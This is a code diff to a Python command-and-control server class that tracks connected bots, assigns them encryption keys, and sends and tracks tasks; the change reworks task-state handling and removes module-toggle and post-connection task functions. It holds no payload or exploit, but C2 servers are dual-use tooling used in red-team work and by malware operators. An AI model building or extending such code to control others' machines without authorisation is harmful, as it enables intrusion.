@@ -1,20 +1,18 @@
 import logging
-
-from qtpy.QtCore import Slot, Signal
-
-from models import Bot, Task, Module, Info
-from core.crypto import generate_key
-
-from QtPyNetwork.server import QBalancedServer
+import datetime
 
 from qasync import asyncSlot
+from qtpy.QtCore import Slot, Signal
+from QtPyNetwork.server import QBalancedServer
+
+from core.crypto import generate_key
+from models import Bot, Task, Info
 
 
 class C2Server(QBalancedServer):
     """C2 server."""
 
     task = Signal(Task)
-    module = Signal(Module)
     info = Signal(Info)
     assigned = Signal(int, str, int)
 
@@ -37,25 +35,24 @@ class C2Server(QBalancedServer):
 
         event_type = message.get("event_type")
         if event_type == "task":
-            event = Task(bot_id, message.get("task_id"),
-                         message.get("task"),
-                         message.get("state"),
-                         message.get("result"),
-                         message.get("exit_code"))
-            bot.on_task_received(event)
-            self.task.emit(event)
-
-        elif event_type == "module":
-            event = Module(bot_id,
-                           message.get("module"),
-                           message.get("enabled"))
-            bot.on_module_received(event)
-            self.module.emit(event)
+            state = message.get("state")
+            task_id = message.get("task_id")
+            task = bot.getTaskById(task_id)
+            if task:
+                if state == "started":
+                    task.set_running(datetime.datetime.now())
+                elif state == "finished":
+                    task.set_finished(datetime.datetime.now(), message.get("result"), message.get("exit_code"))
+                else:
+                    self.logger.error("Unknown task state for message {}".format(message))
+                    return
+                self.task.emit(task)
+            else:
+                self.logger.error("Could not find task with ID {} for bot {}".format(task_id, bot_id))
 
         elif event_type == "info":
             event = Info(bot_id,
                          message.get("info"),
-                         message.get("state"),
                          message.get("results"))
             bot.on_info_received(event)
             self.info.emit(event)
@@ -79,7 +76,6 @@ class C2Server(QBalancedServer):
     @Slot(int, str, int)
     def pre_connection(self, bot_id, ip, port):
         key = generate_key().decode()
-        self.getDeviceById(bot_id).set_custom_key(key)
         self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": key})
 
     @Slot(int, str)
@@ -102,17 +98,6 @@ class C2Server(QBalancedServer):
             else:
                 self.logger.error("BOT-{} not found".format(bot_id))
 
-    @Slot(int, str, bool)
-    def send_module(self, bot_id: int, module_name: str, enabled: bool):
-        """Send module state change request."""
-        bot = self.getDeviceById(bot_id)
-        module_obj = Module(bot_id, module_name, enabled)
-        bot.on_module_received(module_obj)
-        if bot_id == 0:
-            self.writeAll(module_obj.serialize())
-        else:
-            self.write(bot_id, module_obj.serialize())
-
     @Slot(int, list)
     def send_info(self, bot_id: int, info: list):
         """Send info request."""
@@ -127,16 +112,6 @@ class C2Server(QBalancedServer):
     @Slot(int)
     def send_assign_message(self, bot_id):
         self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": generate_key().decode()})
-
-    @Slot(int, dict)
-    def send_after_connection_modules(self, bot_id: int, modules: dict):
-        for module, enabled in modules.items():
-            self.send_module(bot_id, module, enabled)
-
-    @Slot(int, list)
-    def send_after_connection_tasks(self, bot_id: int, tasks: list):
-        for task in tasks:
-            self.send_task(bot_id, task)
 
     @Slot(int, int)
     def stop_task(self, bot_id, task_id):
